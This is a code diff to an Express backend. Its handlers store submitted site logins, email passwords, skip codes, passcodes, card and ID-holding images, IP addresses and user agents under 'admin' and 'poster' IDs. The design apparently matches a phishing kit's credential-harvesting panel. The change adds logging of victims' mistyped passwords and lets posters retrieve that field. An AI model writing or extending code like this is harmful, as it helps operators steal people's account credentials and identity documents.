@@ -398,7 +398,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard ,wrongPassword} = req.body
   const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -408,7 +408,7 @@ export const add_data = async (req, res) => {
         const userFound = await User.findOne({ adminId: adminId })
 
         const posterFound = await Poster.findOne({ posterId: posterId })
-        const pusherFound = await Counter.findOne({ check: pusher })
+        // const pusherFound = await Counter.findOne({ check: pusher })
 
 
         if (userFound && posterFound) {
@@ -418,7 +418,7 @@ export const add_data = async (req, res) => {
                 poster: posterId,
                 root: posterFound._id,
                 onlyCard,holdingCard,
-                // wrongPassword,
+                wrongPassword,
                  ip:ipAddress,
                 agent:userAgent
 
@@ -440,7 +440,7 @@ export const add_data = async (req, res) => {
 
 
     } catch (e) {
-        return  res.status(400).json({ e: "error" })
+        return  res.status(400).json({ e: e })
     }
 
 }
@@ -645,7 +645,7 @@ export const poster_details =  async(req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword createdAt').sort({ createdAt: -1 })
         const newdata = {...poster, details: details }
         console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
